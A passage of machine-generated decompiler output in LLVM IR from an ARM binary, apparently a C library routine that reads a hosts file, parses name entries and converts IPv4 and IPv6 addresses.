  uselistorder i32 24, { 4, 5, 6, 8, 7, 0, 16, 17, 18, 9, 2, 22, 1, 19, 10, 11, 12, 13, 14, 15, 3, 20, 21 }
  uselistorder i32 9, { 7, 8, 9, 10, 11, 1, 20, 2, 12, 0, 13, 14, 3, 15, 5, 16, 17, 18, 19, 4, 6 }
  uselistorder i32 5, { 1, 13, 14, 15, 8, 4, 2, 9, 3, 0, 16, 17, 5, 10, 11, 12, 6, 7 }
  uselistorder i32 (i32)* @function_f4e0, { 2, 0, 1, 3 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @function_14838() local_unnamed_addr {
dec_label_pc_14838:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_18140.596 to i32), i32* @r1, align 4
  %v0_1483c = load i32, i32* @lr, align 4
  store i32 %v0_1483c, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_181a4.630 to i32), i32* @r0, align 4
  %v3_14844 = call i32 @function_d050(i32 ptrtoint ([11 x i8]* @global_var_181a4.630 to i32), i32 ptrtoint (i32* @global_var_18140.596 to i32))
  %v2_14848 = icmp eq i32 %v3_14844, 0
  store i32 ptrtoint (i32* @global_var_18140.596 to i32), i32* @r1, align 4
  br i1 %v2_14848, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_14838
  ret i32 %v3_14844

bb2:                                              ; preds = %dec_label_pc_14838
  store i32 ptrtoint ([18 x i8]* @global_var_181b0.632 to i32), i32* @r0, align 4
  %v2_14858 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14858, i32* @lr, align 4
  %v3_1485c = call i32 @function_d050(i32 ptrtoint ([18 x i8]* @global_var_181b0.632 to i32), i32 ptrtoint (i32* @global_var_18140.596 to i32))
  ret i32 %v3_1485c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_d050, { 8, 4, 3, 2, 7, 6, 5, 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_18140.596 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @function_1486c() local_unnamed_addr {
dec_label_pc_1486c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1486c = load i32, i32* @r4, align 4
  %v6_1486c = load i32, i32* @r5, align 4
  %v12_1486c = load i32, i32* @r7, align 4
  %v15_1486c = load i32, i32* @r8, align 4
  %v21_1486c = load i32, i32* @sl, align 4
  %v24_1486c = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_14878 = sub i32 0, %tmp61
  %v1_1487c = urem i32 %v1_14878, 4
  store i32 %v1_1487c, i32* %ip.global-to-local, align 4
  %v2_1487c = icmp eq i32 %v1_1487c, 0
  %v0_14880 = load i32, i32* @r2, align 4
  %v0_14884 = load i32, i32* @r0, align 4
  %v0_14888 = load i32, i32* @r1, align 4
  %v0_1488c = load i32, i32* @r3, align 4
  store i32 %v0_1488c, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1487c, label %dec_label_pc_148ac, label %dec_label_pc_1489c

dec_label_pc_1489c:                               ; preds = %dec_label_pc_1486c
  %v2_1489c = sub i32 %tmp57, %v1_1487c
  %v3_1489c = icmp ult i32 %tmp57, %v1_1487c
  br i1 %v3_1489c, label %dec_label_pc_14b80, label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_1489c
  store i32 %v2_1489c, i32* %r2.global-to-local, align 4
  %v2_148a8 = add i32 %v1_1487c, %tmp61
  store i32 %v2_148a8, i32* @r4, align 4
  br label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %dec_label_pc_1486c, %dec_label_pc_148a4
  %v0_148bc = phi i32 [ %tmp61, %dec_label_pc_1486c ], [ %v2_148a8, %dec_label_pc_148a4 ]
  %v0_148c0 = phi i32 [ %tmp57, %dec_label_pc_1486c ], [ %v2_1489c, %dec_label_pc_148a4 ]
  %tmp = icmp ult i32 %v0_148c0, 32
  br i1 %tmp, label %dec_label_pc_14b80, label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_148ac
  store i32 %v0_1488c, i32* %r0.global-to-local, align 4
  %v7_148b8 = icmp eq i32 %v0_1488c, 1
  %v1_148bc = add i32 %v0_148bc, 32
  store i32 %v1_148bc, i32* @fp, align 4
  %v1_148c0 = add i32 %v0_148c0, -32
  store i32 %v1_148c0, i32* @r8, align 4
  br i1 %v7_148b8, label %dec_label_pc_149ec, label %dec_label_pc_148c8

dec_label_pc_148c8:                               ; preds = %dec_label_pc_148b4
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_148d4 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_148d4, align 4
  %tmp80 = icmp ult i32 %v1_148c0, 4
  br i1 %tmp80, label %dec_label_pc_14b80, label %dec_label_pc_148dc

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148c8
  %v0_148dc = load i32, i32* %r2.global-to-local, align 4
  %v1_148dc = add i32 %v0_148dc, -36
  store i32 %v1_148dc, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_148dc, 8
  br i1 %tmp81, label %dec_label_pc_14b80, label %dec_label_pc_148e8

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148dc
  %v0_148e8 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_148e8, 16
  br i1 %tmp82, label %dec_label_pc_14b80, label %dec_label_pc_148f0

dec_label_pc_148f0:                               ; preds = %dec_label_pc_148e8
  %v1_148f0 = add i32 %v0_148dc, -48
  store i32 %v1_148f0, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_148f0, 8
  br i1 %tmp83, label %dec_label_pc_14b80, label %dec_label_pc_148fc

dec_label_pc_148fc:                               ; preds = %dec_label_pc_148f0
  %v1_148fc = add i32 %v0_148dc, -44
  store i32 %v1_148fc, i32* @r8, align 4
  %v1_14900 = add i32 %v0_148dc, -56
  store i32 %v1_14900, i32* %r3.global-to-local, align 4
  %v3_14904 = icmp ult i32 %v1_14900, %v1_148fc
  br i1 %v3_14904, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_148fc
  %v1_1490c = load i32, i32* @r4, align 4
  %v2_1490c = add i32 %v1_1490c, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_148fc
  store i32 %v1_14900, i32* @r8, align 4
  %v1_14910.pre = load i32, i32* @r4, align 4
  %v2_14910 = add i32 %v1_14910.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_14910, %.thread1 ], [ %v2_1490c, %bb ]
  %v0_14918 = phi i32 [ %v1_14910.pre, %.thread1 ], [ %v1_1490c, %bb ]
  %v0_14914 = phi i32 [ %v1_14900, %.thread1 ], [ %v1_148fc, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_14918 = add i32 %v0_14918, 36
  store i32 %v1_14918, i32* @r6, align 4
  %v1_1491c = add i32 %v0_14918, 48
  store i32 %v1_1491c, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_14914, 80
  br i1 %tmp84, label %dec_label_pc_14b80, label %dec_label_pc_14924

dec_label_pc_14924:                               ; preds = %bb74
  %v0_14924 = call i32 @function_14838()
  store i32 %v0_14924, i32* %r0.global-to-local, align 4
  %v2_14928 = icmp eq i32 %v0_14924, 0
  br i1 %v2_14928, label %dec_label_pc_14944, label %.thread

.thread:                                          ; preds = %dec_label_pc_14924
  %v1_14930 = load i32, i32* @fp, align 4
  store i32 %v1_14930, i32* @r7, align 4
  %v1_14934 = load i32, i32* @r5, align 4
  store i32 %v1_14934, i32* @fp, align 4
  %v1_14938 = load i32, i32* @r6, align 4
  %v1_1493c = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_149f8

dec_label_pc_14944:                               ; preds = %dec_label_pc_14924
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_1494c = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_1494c, align 4
  %v0_14950 = call i32 @function_cec4()
  store i32 %v0_14950, i32* %r0.global-to-local, align 4
  %v1_14954 = inttoptr i32 %v0_14950 to i32*
  %v2_14954 = load i32, i32* %v1_14954, align 4
  store i32 %v2_14954, i32* @sl, align 4
  br label %dec_label_pc_14b84

dec_label_pc_1495c:                               ; preds = %dec_label_pc_14b0c
  %v0_1495c = load i32, i32* @r4, align 4
  %v1_1495c = add i32 %v0_1495c, 4
  %v2_1495c = inttoptr i32 %v1_1495c to i32*
  %v3_1495c = load i32, i32* %v2_1495c, align 4
  %v1_14960 = load i32, i32* @sb, align 4
  %v2_14960 = inttoptr i32 %v1_14960 to i32*
  store i32 %v3_1495c, i32* %v2_14960, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_14974 = load i32, i32* @r4, align 4
  %v1_14974 = add i32 %v0_14974, 8
  store i32 %v1_14974, i32* %r1.global-to-local, align 4
  %v1_14978 = load i32, i32* @sb, align 4
  %v2_14978 = add i32 %v1_14978, 8
  %v3_14978 = inttoptr i32 %v2_14978 to i32*
  store i32 2, i32* %v3_14978, align 4
  %v0_1497c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1497c, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_14984 = load i32, i32* @sb, align 4
  %v1_14984 = load i32, i32* %ip.global-to-local, align 4
  %v2_14984 = inttoptr i32 %v1_14984 to i32*
  store i32 %v0_14984, i32* %v2_14984, align 4
  %v0_14988 = load i32, i32* @r7, align 4
  %v1_14988 = load i32, i32* %r0.global-to-local, align 4
  %v2_14988 = inttoptr i32 %v1_14988 to i32*
  store i32 %v0_14988, i32* %v2_14988, align 4
  %v0_1498c = load i32, i32* %r3.global-to-local, align 4
  %v1_1498c = load i32, i32* @sb, align 4
  %v2_1498c = add i32 %v1_1498c, 12
  %v3_1498c = inttoptr i32 %v2_1498c to i32*
  store i32 %v0_1498c, i32* %v3_1498c, align 4
  %v0_14990 = load i32, i32* %r0.global-to-local, align 4
  %v1_14990 = load i32, i32* @sb, align 4
  %v2_14990 = add i32 %v1_14990, 16
  %v3_14990 = inttoptr i32 %v2_14990 to i32*
  store i32 %v0_14990, i32* %v3_14990, align 4
  %v0_14994 = load i32, i32* %r1.global-to-local, align 4
  %v1_14994 = load i32, i32* @sb, align 4
  %v2_14994 = add i32 %v1_14994, 4
  %v3_14994 = inttoptr i32 %v2_14994 to i32*
  store i32 %v0_14994, i32* %v3_14994, align 4
  %v0_14998 = load i32, i32* %r2.global-to-local, align 4
  %v1_14998 = load i32, i32* %r0.global-to-local, align 4
  %v2_14998 = add i32 %v1_14998, 4
  %v3_14998 = inttoptr i32 %v2_14998 to i32*
  store i32 %v0_14998, i32* %v3_14998, align 4
  br label %dec_label_pc_14b68

dec_label_pc_149a0:                               ; preds = %dec_label_pc_14b34
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_149a4 = load i32, i32* @r4, align 4
  %v1_149a4 = add i32 %v0_149a4, 4
  %v2_149a4 = inttoptr i32 %v1_149a4 to i32*
  %v3_149a4 = load i32, i32* %v2_149a4, align 4
  store i32 %v3_149a4, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_149ac = load i32, i32* @sb, align 4
  %v2_149ac = inttoptr i32 %tmp53 to i32*
  store i32 %v0_149ac, i32* %v2_149ac, align 4
  store i32 %v0_14a04, i32* %ip.global-to-local, align 4
  %v0_149b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149b4 = load i32, i32* @sb, align 4
  %v2_149b4 = inttoptr i32 %v1_149b4 to i32*
  store i32 %v0_149b4, i32* %v2_149b4, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_149c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_149c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_149c0 = inttoptr i32 %v1_149c0 to i32*
  store i32 %v0_149c0, i32* %v2_149c0, align 4
  %v0_149c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_149c4 = load i32, i32* @sb, align 4
  %v2_149c4 = add i32 %v1_149c4, 12
  %v3_149c4 = inttoptr i32 %v2_149c4 to i32*
  store i32 %v0_149c4, i32* %v3_149c4, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_149d0 = load i32, i32* @r4, align 4
  %v1_149d0 = add i32 %v0_149d0, 8
  store i32 %v1_149d0, i32* %r1.global-to-local, align 4
  %v0_149d4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_149d4, i32* @sl, align 4
  %v1_149d8 = load i32, i32* @sb, align 4
  %v2_149d8 = add i32 %v1_149d8, 8
  %v3_149d8 = inttoptr i32 %v2_149d8 to i32*
  store i32 10, i32* %v3_149d8, align 4
  %v0_149dc = load i32, i32* %r3.global-to-local, align 4
  %v1_149dc = load i32, i32* @sb, align 4
  %v2_149dc = add i32 %v1_149dc, 16
  %v3_149dc = inttoptr i32 %v2_149dc to i32*
  store i32 %v0_149dc, i32* %v3_149dc, align 4
  %v0_149e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_149e0 = load i32, i32* @sb, align 4
  %v2_149e0 = add i32 %v1_149e0, 4
  %v3_149e0 = inttoptr i32 %v2_149e0 to i32*
  store i32 %v0_149e0, i32* %v3_149e0, align 4
  %v0_149e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_149e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_149e4 = add i32 %v1_149e4, 4
  %v3_149e4 = inttoptr i32 %v2_149e4 to i32*
  store i32 %v0_149e4, i32* %v3_149e4, align 4
  br label %dec_label_pc_14b68

dec_label_pc_149ec:                               ; preds = %dec_label_pc_148b4
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_149f8

dec_label_pc_149f8:                               ; preds = %.thread, %dec_label_pc_149ec
  %v2_14a08.pre-phi = phi i32* [ %v2_148d4, %.thread ], [ %.pre, %dec_label_pc_149ec ]
  %v0_14a04 = phi i32 [ %v1_14930, %.thread ], [ 0, %dec_label_pc_149ec ]
  %stack_var_-40.1 = phi i32 [ %v1_1493c, %.thread ], [ 0, %dec_label_pc_149ec ]
  %stack_var_-48.1 = phi i32 [ %v1_14938, %.thread ], [ 0, %dec_label_pc_149ec ]
  %stack_var_-52.0 = phi i32 [ %v0_14924, %.thread ], [ %v0_14884, %dec_label_pc_149ec ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_14a08.pre-phi, align 4
  %v2_14acc = inttoptr i32 %v0_14888 to i8*
  %v7_14b04 = icmp eq i32 %v0_14880, 2
  %v7_14b2c = icmp eq i32 %v0_14880, 10
  br label %dec_label_pc_14b50

dec_label_pc_14a10:                               ; preds = %dec_label_pc_14b50
  %v0_14a10 = load i32, i32* @fp, align 4
  store i32 %v0_14a10, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_14a18 = call i32 @function_14c58(i32 %v0_14a10, i32 35)
  store i32 %v2_14a18, i32* %r0.global-to-local, align 4
  %v3_14a1c = icmp eq i32 %v2_14a18, 0
  br i1 %v3_14a1c, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_14a10
  %v0_14a2411 = load i32, i32* @fp, align 4
  store i32 %v0_14a2411, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_14a90.preheader

bb75:                                             ; preds = %dec_label_pc_14a10
  %v3_14a18 = inttoptr i32 %v2_14a18 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14a24 = load i32, i32* @fp, align 4
  store i32 %v0_14a24, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_14a18, align 1
  %v0_14a9030.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14a90.preheader

dec_label_pc_14a90.preheader:                     ; preds = %bb75, %.thread10
  %v0_14a9030 = phi i32 [ %v0_14a9030.pre, %bb75 ], [ %v0_14a2411, %.thread10 ]
  %v1_14a9031 = inttoptr i32 %v0_14a9030 to i8*
  %v2_14a9032 = load i8, i8* %v1_14a9031, align 1
  %v3_14a9033 = zext i8 %v2_14a9032 to i32
  store i32 %v3_14a9033, i32* %r3.global-to-local, align 4
  %v2_14a9434 = icmp eq i8 %v2_14a9032, 0
  br i1 %v2_14a9434, label %dec_label_pc_14a9c, label %dec_label_pc_14a3c.preheader

dec_label_pc_14a34:                               ; preds = %dec_label_pc_14a48
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_14a38 = inttoptr i32 %v8_14a60 to i8*
  store i8 0, i8* %v3_14a38, align 1
  %v4_14a38 = load i32, i32* %r2.global-to-local, align 4
  %v5_14a38 = add i32 %v4_14a38, 1
  store i32 %v5_14a38, i32* %r2.global-to-local, align 4
  %v1_14a3c = inttoptr i32 %v5_14a38 to i8*
  %v2_14a3c = load i8, i8* %v1_14a3c, align 1
  %v3_14a3c = zext i8 %v2_14a3c to i32
  store i32 %v3_14a3c, i32* %r1.global-to-local, align 4
  %v2_14a40 = icmp eq i8 %v2_14a3c, 0
  br i1 %v2_14a40, label %dec_label_pc_14a9c, label %dec_label_pc_14a48

dec_label_pc_14a48:                               ; preds = %dec_label_pc_14a3c.preheader, %dec_label_pc_14a34
  %v8_14a60 = phi i32 [ %v5_14a38, %dec_label_pc_14a34 ], [ %v0_14a3c20, %dec_label_pc_14a3c.preheader ]
  %v1_14a50 = phi i32 [ %v3_14a3c, %dec_label_pc_14a34 ], [ %v3_14a3c23, %dec_label_pc_14a3c.preheader ]
  %v2_14a4c = load i32, i32* @global_var_205f0, align 4
  store i32 %v2_14a4c, i32* %r3.global-to-local, align 4
  %v3_14a50 = mul nuw nsw i32 %v1_14a50, 2
  %v4_14a50 = add i32 %v3_14a50, %v2_14a4c
  %v5_14a50 = inttoptr i32 %v4_14a50 to i8*
  %v6_14a50 = load i8, i8* %v5_14a50, align 1
  %v8_14a50 = zext i8 %v6_14a50 to i32
  store i32 %v8_14a50, i32* %r3.global-to-local, align 4
  %v1_14a54 = and i32 %v8_14a50, 32
  %v2_14a54 = icmp eq i32 %v1_14a54, 0
  br i1 %v2_14a54, label %dec_label_pc_14a5c, label %dec_label_pc_14a34

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a48
  %v0_14a5c = load i32, i32* @r6, align 4
  %v7_14a60 = icmp slt i32 %v0_14a5c, 7
  br i1 %v7_14a60, label %bb76, label %dec_label_pc_14a70.preheader

bb76:                                             ; preds = %dec_label_pc_14a5c
  %v9_14a60 = load i32, i32* @r4, align 4
  %v13_14a60 = mul i32 %v0_14a5c, 4
  %v14_14a60 = add i32 %v9_14a60, %v13_14a60
  %v15_14a60 = inttoptr i32 %v14_14a60 to i32*
  store i32 %v8_14a60, i32* %v15_14a60, align 4
  %v8_14a64 = load i32, i32* @r6, align 4
  %v9_14a64 = add i32 %v8_14a64, 1
  store i32 %v9_14a64, i32* @r6, align 4
  %v0_14a7025.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14a70.preheader

dec_label_pc_14a70.preheader:                     ; preds = %bb76, %dec_label_pc_14a5c
  %v0_14a7025 = phi i32 [ %v0_14a7025.pre, %bb76 ], [ %v8_14a60, %dec_label_pc_14a5c ]
  %v1_14a7026 = inttoptr i32 %v0_14a7025 to i8*
  %v2_14a7027 = load i8, i8* %v1_14a7026, align 1
  %v3_14a7028 = zext i8 %v2_14a7027 to i32
  store i32 %v3_14a7028, i32* %r1.global-to-local, align 4
  %v2_14a7429 = icmp eq i8 %v2_14a7027, 0
  br i1 %v2_14a7429, label %dec_label_pc_14a90.loopexit, label %dec_label_pc_14a7c.lr.ph

dec_label_pc_14a7c.lr.ph:                         ; preds = %dec_label_pc_14a70.preheader
  %v2_14a80.pre = load i32, i32* @global_var_205f0, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14a6c:                               ; preds = %dec_label_pc_14a7c
  %v1_14a6c = add i32 %v0_14a6c, 1
  store i32 %v1_14a6c, i32* %r2.global-to-local, align 4
  %v1_14a70 = inttoptr i32 %v1_14a6c to i8*
  %v2_14a70 = load i8, i8* %v1_14a70, align 1
  %v3_14a70 = zext i8 %v2_14a70 to i32
  store i32 %v3_14a70, i32* %r1.global-to-local, align 4
  %v2_14a74 = icmp eq i8 %v2_14a70, 0
  br i1 %v2_14a74, label %dec_label_pc_14a90.loopexit, label %dec_label_pc_14a7c

dec_label_pc_14a7c:                               ; preds = %dec_label_pc_14a7c.lr.ph, %dec_label_pc_14a6c
  %v0_14a6c = phi i32 [ %v0_14a7025, %dec_label_pc_14a7c.lr.ph ], [ %v1_14a6c, %dec_label_pc_14a6c ]
  %v1_14a84 = phi i32 [ %v3_14a7028, %dec_label_pc_14a7c.lr.ph ], [ %v3_14a70, %dec_label_pc_14a6c ]
  store i32 %v2_14a80.pre, i32* %r3.global-to-local, align 4
  %v3_14a84 = mul nuw nsw i32 %v1_14a84, 2
  %v4_14a84 = add i32 %v3_14a84, %v2_14a80.pre
  %v5_14a84 = inttoptr i32 %v4_14a84 to i8*
  %v6_14a84 = load i8, i8* %v5_14a84, align 1
  %v8_14a84 = zext i8 %v6_14a84 to i32
  store i32 %v8_14a84, i32* %r3.global-to-local, align 4
  %v1_14a88 = and i32 %v8_14a84, 32
  %v2_14a88 = icmp eq i32 %v1_14a88, 0
  br i1 %v2_14a88, label %dec_label_pc_14a6c, label %dec_label_pc_14a90.loopexit

dec_label_pc_14a90.loopexit:                      ; preds = %dec_label_pc_14a7c, %dec_label_pc_14a6c, %dec_label_pc_14a70.preheader
  %v0_14a90 = phi i32 [ %v0_14a7025, %dec_label_pc_14a70.preheader ], [ %v0_14a6c, %dec_label_pc_14a7c ], [ %v1_14a6c, %dec_label_pc_14a6c ]
  %v1_14a90 = inttoptr i32 %v0_14a90 to i8*
  %v2_14a90 = load i8, i8* %v1_14a90, align 1
  %v3_14a90 = zext i8 %v2_14a90 to i32
  store i32 %v3_14a90, i32* %r3.global-to-local, align 4
  %v2_14a94 = icmp eq i8 %v2_14a90, 0
  br i1 %v2_14a94, label %dec_label_pc_14a9c, label %dec_label_pc_14a3c.preheader

dec_label_pc_14a3c.preheader:                     ; preds = %dec_label_pc_14a90.preheader, %dec_label_pc_14a90.loopexit
  %v0_14a3c20 = phi i32 [ %v0_14a90, %dec_label_pc_14a90.loopexit ], [ %v0_14a9030, %dec_label_pc_14a90.preheader ]
  %v1_14a3c21 = inttoptr i32 %v0_14a3c20 to i8*
  %v2_14a3c22 = load i8, i8* %v1_14a3c21, align 1
  %v3_14a3c23 = zext i8 %v2_14a3c22 to i32
  store i32 %v3_14a3c23, i32* %r1.global-to-local, align 4
  %v2_14a4024 = icmp eq i8 %v2_14a3c22, 0
  br i1 %v2_14a4024, label %dec_label_pc_14a9c, label %dec_label_pc_14a48

dec_label_pc_14a9c:                               ; preds = %dec_label_pc_14a90.loopexit, %dec_label_pc_14a3c.preheader, %dec_label_pc_14a34, %dec_label_pc_14a90.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14aa0 = load i32, i32* @r6, align 4
  %v1_14aa4 = load i32, i32* @r4, align 4
  %v5_14aa4 = mul i32 %v0_14aa0, 4
  %v6_14aa4 = add i32 %v1_14aa4, %v5_14aa4
  %v7_14aa4 = inttoptr i32 %v6_14aa4 to i32*
  store i32 0, i32* %v7_14aa4, align 4
  %v7_14aa8 = icmp sgt i32 %v0_14aa0, 1
  br i1 %v7_14aa8, label %dec_label_pc_14aac, label %dec_label_pc_14b50

dec_label_pc_14aac:                               ; preds = %dec_label_pc_14a9c
  %v2_14aac = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_14aac, i32* %r0.global-to-local, align 4
  %v7_14ab0 = icmp eq i32 %v2_14aac, 1
  br i1 %v7_14ab0, label %dec_label_pc_14b84, label %dec_label_pc_14ab8

dec_label_pc_14ab8:                               ; preds = %dec_label_pc_14aac
  %v7_14ab8 = icmp eq i32 %v2_14aac, 2
  br i1 %v7_14ab8, label %dec_label_pc_14ac4, label %dec_label_pc_14af0.preheader

dec_label_pc_14af0.preheader:                     ; preds = %dec_label_pc_14ab8
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_14af0

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14ab8
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v0_14ac8 = load i32, i32* @r4, align 4
  %v1_14ac8 = inttoptr i32 %v0_14ac8 to i32*
  %v2_14ac8 = load i32, i32* %v1_14ac8, align 4
  store i32 %v2_14ac8, i32* @r1, align 4
  %v3_14acc = call i32 @function_f010(i8* %v2_14acc, i32 %v2_14ac8)
  store i32 %v3_14acc, i32* %r0.global-to-local, align 4
  %v2_14ad0 = icmp eq i32 %v3_14acc, 0
  br i1 %v2_14ad0, label %dec_label_pc_14b00, label %dec_label_pc_14b50

dec_label_pc_14adc:                               ; preds = %dec_label_pc_14af0
  %v0_14adc = load i32, i32* @r4, align 4
  %v4_14adc = mul i32 %v1_14adc, 4
  %v5_14adc = add i32 %v0_14adc, %v4_14adc
  %v6_14adc = inttoptr i32 %v5_14adc to i32*
  %v7_14adc = load i32, i32* %v6_14adc, align 4
  store i32 %v7_14adc, i32* %r1.global-to-local, align 4
  %v3_14ae0 = call i32 @function_f464(i8* %v2_14acc, i32 %v7_14adc)
  store i32 %v3_14ae0, i32* %r0.global-to-local, align 4
  %v2_14ae4 = icmp eq i32 %v3_14ae0, 0
  %v0_14ae8 = load i32, i32* @r5, align 4
  %v1_14ae8 = add i32 %v0_14ae8, 1
  store i32 %v1_14ae8, i32* @r5, align 4
  br i1 %v2_14ae4, label %dec_label_pc_14b00, label %dec_label_pc_14af0

dec_label_pc_14af0:                               ; preds = %dec_label_pc_14af0.preheader, %dec_label_pc_14adc
  %v1_14adc = phi i32 [ 1, %dec_label_pc_14af0.preheader ], [ %v1_14ae8, %dec_label_pc_14adc ]
  %v1_14af0 = load i32, i32* @r6, align 4
  store i32 %v0_14888, i32* %r0.global-to-local, align 4
  %v5_14af8 = icmp slt i32 %v1_14adc, %v1_14af0
  br i1 %v5_14af8, label %dec_label_pc_14adc, label %dec_label_pc_14b50

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14adc, %dec_label_pc_14ac4
  store i32 %v0_14880, i32* %r1.global-to-local, align 4
  br i1 %v7_14b04, label %dec_label_pc_14b0c, label %dec_label_pc_14b28

dec_label_pc_14b0c:                               ; preds = %dec_label_pc_14b00
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_14b10 = load i32, i32* @r7, align 4
  store i32 %v0_14b10, i32* %r2.global-to-local, align 4
  %v0_14b14 = load i32, i32* @r4, align 4
  %v1_14b14 = inttoptr i32 %v0_14b14 to i32*
  %v2_14b14 = load i32, i32* %v1_14b14, align 4
  store i32 %v2_14b14, i32* %r1.global-to-local, align 4
  %v3_14b18 = inttoptr i32 %v2_14b14 to i8*
  %v4_14b18 = call i32 @function_13f78(i32 2, i8* %v3_14b18, i32 %v0_14b10)
  store i32 %v4_14b18, i32* %r0.global-to-local, align 4
  %v5_14b20 = icmp sgt i32 %v4_14b18, 0
  br i1 %v5_14b20, label %dec_label_pc_1495c, label %dec_label_pc_14b4c

dec_label_pc_14b28:                               ; preds = %dec_label_pc_14b00
  store i32 %v0_14880, i32* %r2.global-to-local, align 4
  br i1 %v7_14b2c, label %dec_label_pc_14b34, label %dec_label_pc_14b4c

dec_label_pc_14b34:                               ; preds = %dec_label_pc_14b28
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_14b38 = load i32, i32* @r4, align 4
  %v1_14b38 = inttoptr i32 %v0_14b38 to i32*
  %v2_14b38 = load i32, i32* %v1_14b38, align 4
  store i32 %v2_14b38, i32* %r1.global-to-local, align 4
  store i32 %v0_14a04, i32* %r2.global-to-local, align 4
  %v3_14b40 = inttoptr i32 %v2_14b38 to i8*
  %v4_14b40 = call i32 @function_13f78(i32 10, i8* %v3_14b40, i32 %v0_14a04)
  store i32 %v4_14b40, i32* %r0.global-to-local, align 4
  %v5_14b48 = icmp sgt i32 %v4_14b40, 0
  br i1 %v5_14b48, label %dec_label_pc_149a0, label %dec_label_pc_14b4c

dec_label_pc_14b4c:                               ; preds = %dec_label_pc_14b0c, %dec_label_pc_14b28, %dec_label_pc_14b34
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_14b50

dec_label_pc_14b50:                               ; preds = %dec_label_pc_14af0, %dec_label_pc_14ac4, %dec_label_pc_14a9c, %dec_label_pc_14b4c, %dec_label_pc_149f8
  %v0_14b50 = load i32, i32* @fp, align 4
